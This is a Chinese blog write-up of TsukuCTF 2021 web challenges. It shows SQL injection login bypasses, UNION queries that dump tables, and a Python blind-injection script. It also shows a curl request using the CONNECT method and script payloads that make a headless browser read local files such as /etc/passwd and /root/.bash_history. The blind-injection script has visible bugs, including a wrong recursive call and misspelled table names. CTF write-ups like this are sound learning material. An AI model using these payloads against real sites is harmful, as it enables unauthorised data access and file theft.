---
title: "TsukuCTF2021 Wp"
slug: "tsuku2021-wp"
description: "水一下，题不太难，但也学到一些新东西"
date: 2021-09-13T19:15:21+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

这两天又开始有点摆烂的迹象，于是把周末的ctf看看wp，水一水，复现一下

另外这个ctf最痛苦的地方在于是英日夹杂，我开始懂歪果仁做中文比赛页面的时候有多痛苦了

## Web/logonly

给出的是一个有214155行的日志文件，只有第214154行返回200ok

显然是进行了一个字典攻击，在第214154次尝试时撞对了，我们下载一份kali里的rockyou.txt中看一下214154是个啥（有提示用到kali进行攻击）

![image-20210912171725965](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912171725965.png)

`TsukuCTF{qwertyuiop[]\\}`

## Web/digits

一个fastapi站，但是要求不是很高的样子

![image-20210912174109098](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912174109098.png)

![image-20210912174032687](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912174032687.png)

加号放到url中相当于半角空格

`TsukuCTF{you_are_lucky_Tsukushi}`

## Web/login

登录框，万能密码`admin'or 1#`

`TsukuCTF{You_4r3_SUP3R_H4CKER}`

一般这种简单的登录都是万能密码，但是也得多试一试，加个注释符啊 分号什么的

## Web/login2

说是代码重构过了

再用上面的万能密码登入会显示这个站的所有账号

![image-20210912175523340](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912175523340.png)

说明还是有sqli，尝试一下联合注入`admin'or 1 union select null,null#`，跟上面是一样的回显，说明有两列，然后是愉快的注入（每一次的回显在页面的末尾，注意这个是最初要找到并确认的）

```
admin'or 1 union select table_name,null from information_schema.columns#
admin'or 1 union select column_name,null from information_schema.columns where table_name='super_secret_table'#
admin'or 1 union select secret,null from super_secret_table#
```

`TsukuCTF{50_muCh_GR3AT_Hacker_!ND3ED}`

## Web/login3

依然是存在sqli，用上面的两个payload都能回显正常，但是没有明确的信息，应该是需要盲注了

```python
import requests
def _execAnyQuery_core(query, pos, mid):
    url = ""
    params = {
        "name": "'or ascii(substring(({0}),{1},1))>={2};#".format(query, pos, mid),
        "password": "a"
    }
    page = requests.post(url, data = params)
    return "ようこそ" in page.text

def _execAnyQuery(query, pos):
    low = 0
    high = 256
    while high - low > 1:
        mid = (high + low) // 2
        if _execAnyQuery(query, pos, mid):
            low = mid
        else:
            high = mid
    return low

def execAnyQuery(query):
    i = 1
    while True:
        char = int(_execAnyQuery(query, i))
        if char == 0:
            return
        print(chr(char), end="")
        i += 1

execAnyQuery("select version()")

for i in range(100):
    execAnyQuery("select distinct table_name from information_schema.columnns limit 1 offset {0}".format(i))
    print()

for i in range(10):
    execAnyQuery("select distinct column_name from information_shcema.columns where table_name='urtla_secret_tsukushi'limit 1 offset {0}".format(i))
    print()

for i in range(33):
    execAnyQuery("select secret from urtla_secret_tsukushi_limit 1 offset {0}".format(i))
```

这是官方wp里的二分法脚本，把简单的事拆成了3个函数，倒是也好，可复用性max

`TsukuCTF{U_Are_Geni0us_T$UKUSH1}`

## Web/Journey

抓包看，有很多307重定向，还以为是跟之前那个一样要跑一下一千多次的重定向，但是这个重定向是有限度的，最后的位置是/problems/journey/goal，回显405错误

看wp，学到了

```bash
curl -H 'Referer: https://tsukuctf.sechack365.com/problems/journey/railway/1' -X CONNECT https://tsukuctf.sechack365.com/problems/journey/goal
```

![image-20210913114745032](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913114745032.png)

利用的是http请求中的connect方法，相关内容可参见->[CONNECT(MDN)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/CONNECT)  |  [HTTP之connect method](https://www.jianshu.com/p/54357cdd4736)

## Web/gyOTAKU

![image-20210913120544616](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913120544616.png)

![image-20210913120625401](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913120625401.png)

满足17行要求的话会通过chromium browser来返回一个截图

我们构造一个如下的html页面

```
<script>alert(1);</script>
```

返回500错误，再试一下

```
<script>location.href="/etc/passwd"</script>
```

成功返回

![image-20210913190757615](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913190757615.png)

用一下我们的老朋友/root/.bash_history

```
<script>location.href="/root/.bash_history"</script>
```

![image-20210913191326852](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913191326852.png)

可以读一下flag了

```
<script>location.href="/root/flagc464f9eba1.txt"</script>
```

`TsukuCTF{Tsukushi_to_Sugina_no_chigai_ga_wakaran}`

------

水一篇wp，水水更健康